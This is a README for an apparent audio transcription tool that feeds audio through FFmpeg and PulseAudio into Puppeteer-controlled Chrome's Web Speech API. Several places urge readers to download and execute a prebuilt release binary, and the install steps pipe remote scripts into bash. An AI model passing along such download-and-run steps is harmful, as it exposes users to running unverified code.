[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/Keatonkirk55cfc/audio-to-text/releases)

# Audio-to-Text — Web Speech API, Puppeteer & PulseAudio 🎙️🔊

![Microphone waveform](https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/Sound-waves.svg/1280px-Sound-waves.svg.png)

Convert local audio into text using the Web Speech API with a headless browser. This project combines Puppeteer, FFmpeg, PulseAudio and Bun/Node to feed audio into Chrome, drive the Web Speech API, and capture transcriptions. Use it for batch transcription, voice logging, and test automation that needs speech-to-text from files.

Badges
- Topics: audio, audio-to-text, bun, ffmpeg, node, puppeteer, speech, text, transcription, voice, webspeechapi
- Releases: [Download a release](https://github.com/Keatonkirk55cfc/audio-to-text/releases) (download the release file and execute it)

Build targets
- Bun script runner and Node.js script
- Linux with PulseAudio (or PipeWire with Pulse compatibility)
- Chrome/Chromium via Puppeteer
- FFmpeg for format conversion and piping

Table of contents
- Features
- Requirements
- Install
- Quick start
- How it works
- CLI options
- API (example)
- Tuning and tips
- Releases
- Troubleshooting
- License

Features
- Transcribe WAV, MP3, FLAC and other formats to text.
- Use the browser Web Speech API for reliable, local-like transcription.
- Stream audio into Chrome via PulseAudio virtual devices.
- Batch mode for many files.
- Works with Bun or Node tooling.

Requirements
- Linux with PulseAudio (or PipeWire with PulseAudio compatibility).
- Chrome or Chromium.
- FFmpeg.
- Bun or Node (v16+ recommended).
- Git and curl or wget for downloads.

Install

1) System packages (example for Debian/Ubuntu)
```bash
sudo apt update
sudo apt install -y pulseaudio pulseaudio-utils ffmpeg wget unzip
```

2) Chrome
- Install Chrome or Chromium as a system package.
- Confirm chromedriver or browser is accessible to Puppeteer.

3) Node or Bun
- Node:
  curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
  sudo apt install -y nodejs
- Bun:
  curl https://bun.sh/install | bash

4) Repository
```bash
git clone https://github.com/Keatonkirk55cfc/audio-to-text.git
cd audio-to-text
```

Quick start

1) Create a PulseAudio null sink. This creates a virtual output device that feeds Chrome.
```bash
pactl load-module module-null-sink sink_name=virtual_speech sink_properties=device.description=VirtualSpeech
```

2) Play an audio file into the null sink via FFmpeg. Use this to feed Chrome.
```bash
ffmpeg -re -i input.mp3 -f wav -ar 16000 -ac 1 - | pacat --playback --device=VirtualSpeech.monitor
```

3) Start the recorder script (Bun or Node). The script launches Puppeteer, opens a page that uses SpeechRecognition, and listens to the virtual sink monitor.
- Bun
```bash
bun run ./scripts/transcribe.js --file input.mp3
```
- Node
```bash
node ./scripts/transcribe.js --file input.mp3
```

How it works

- The script launches a headless or headed Chrome instance with flags to allow audio capture.
- Puppeteer opens a small HTML page. The page uses the Web Speech API (SpeechRecognition).
- FFmpeg plays the audio into a virtual PulseAudio sink.
- Chrome accesses the sink monitor as a microphone source.
- The page transcribes speech and streams text back via Puppeteer.
- The script collects outputs and writes to stdout or a file.

Core concepts

- PulseAudio null sink: creates a virtual device. A monitor of that sink acts like a microphone.
- FFmpeg: convert files to PCM at a sample rate Chrome accepts.
- Puppeteer: control Chrome and send back events.
- Web Speech API: browser built-in speech recognition.

Example HTML used by the page (simplified)
```html
<!doctype html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
  const rec = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
  rec.lang = 'en-US';
  rec.interimResults = true;
  rec.continuous = true;

  rec.onresult = (e) => {
    let full = '';
    for (let i=0; i<e.results.length; i++) {
      full += e.results[i][0].transcript + (e.results[i].isFinal ? '\n' : '');
    }
    // Puppeteer will read console.log calls
    console.log('TRANSCRIPT:' + full);
  };

  rec.onerror = (ev) => console.log('ERROR:' + ev.error);
  rec.start();
</script>
</body>
</html>
```

CLI options (example)
- --file <path>   Path to input audio file.
- --out <path>    Write transcript to file.
- --lang <tag>    Language tag (default: en-US).
- --headful       Launch Chrome with UI for debugging.
- --sample-rate   Force sample rate for FFmpeg (default: 16000).
- --device        PulseAudio sink monitor name.

Sample commands

Single file to stdout
```bash
node ./scripts/transcribe.js --file ./samples/interview.mp3
```

Batch mode writing per-file transcripts
```bash
node ./scripts/transcribe.js --dir ./audio --out-dir ./transcripts
```

Advanced tips

- Use 16 kHz mono WAV for best compatibility.
- If Chrome returns no speech, confirm the sink monitor shows input:
  pactl list sources short
- If you see silence, play the file locally first to confirm FFmpeg output.

Puppeteer flags
To ensure Chrome reads from the virtual device, the script starts Chrome with these flags:
--use-fake-ui-for-media-stream --enable-experimental-web-platform-features --allow-file-access-from-files

You may run a headed browser for easier debugging:
```bash
node ./scripts/transcribe.js --file input.wav --headful
```

PulseAudio details

- Create sink:
  pactl load-module module-null-sink sink_name=virtual_speech sink_properties=device.description=VirtualSpeech

- Monitor name: VirtualSpeech.monitor
- Use pacat or FFmpeg to route audio to the sink monitor.

FFmpeg example for piping
```bash
ffmpeg -i input.flac -f wav -ar 16000 -ac 1 - | pacat --playback --device=VirtualSpeech.monitor
```

Streaming live audio
- Replace file input with a live microphone capture if needed.
- Route mic into the same sink and use mixer controls to merge streams.

Releases
Download the latest release file from the Releases page and execute it. The releases page contains prebuilt binaries and example bundles you can run. Visit:
https://github.com/Keatonkirk55cfc/audio-to-text/releases

If a release includes a binary, download that file and run:
```bash
chmod +x audio-to-text-linux-x64
./audio-to-text-linux-x64 --file sample.wav
```
If the release includes a script or archive, extract and run the provided startup script.

API (example usage)

Node example: control flow to transcribe a file and write JSON output.
```js
const { launchTranscriber } = require('./lib/transcribe');

async function main() {
  const t = await launchTranscriber({ headful: false });
  const result = await t.transcribeFile('./samples/dialogue.mp3', { lang: 'en-US' });
  console.log(JSON.stringify(result, null, 2));
  await t.close();
}

main().catch(e => console.error(e));
```

Output format
- text: raw transcript string.
- segments: array of { start, end, text } when segmentation is implemented.
- meta: engine info, sample rate, duration.

Tuning and tips

- Language models: set correct lang tag for the Web Speech API.
- Sample rate: choose 16000 Hz or 44100 Hz depending on Chrome's expectations.
- Noise: clean audio yields better results.
- Long files: split into chunks to avoid timeouts in the browser.
- Headful mode: use it to watch recognition and debug errors printed to console.

Troubleshooting

- No audio captured:
  - Confirm the virtual sink and its monitor exist.
  - Use pactl list sources short to find monitors.

- Chrome denies access to audio:
  - Use Puppeteer flags to bypass permission prompts.
  - Use --use-fake-ui-for-media-stream.

- Puppeteer cannot launch Chrome:
  - Ensure Chrome/Chromium is installed and on PATH.
  - Match Puppeteer version to your Chromium version or use puppeteer-core.

- Transcripts contain garbage:
  - Check sample rate and channel setup.
  - Test with a short, clean sample.

Files of interest
- scripts/transcribe.js — main CLI runner.
- lib/pulse.js — PulseAudio utilities.
- lib/ffmpeg.js — FFmpeg helpers.
- static/recognizer.html — page loaded by Puppeteer with SpeechRecognition.

Contributing
- Open issues for bugs or feature requests.
- Send pull requests with tests and clear descriptions.
- Keep commits small and focused.

Assets and images
- Waveform image: Wikimedia Commons.
- Microphone emoji used inline for visual cues.

License
- MIT. Check the LICENSE file in the repo.

Contact
- Open an issue on GitHub or use PRs for code changes.

Releases link (again): https://github.com/Keatonkirk55cfc/audio-to-text/releases

Enjoy this tool for programmatic transcription and automated voice workflows.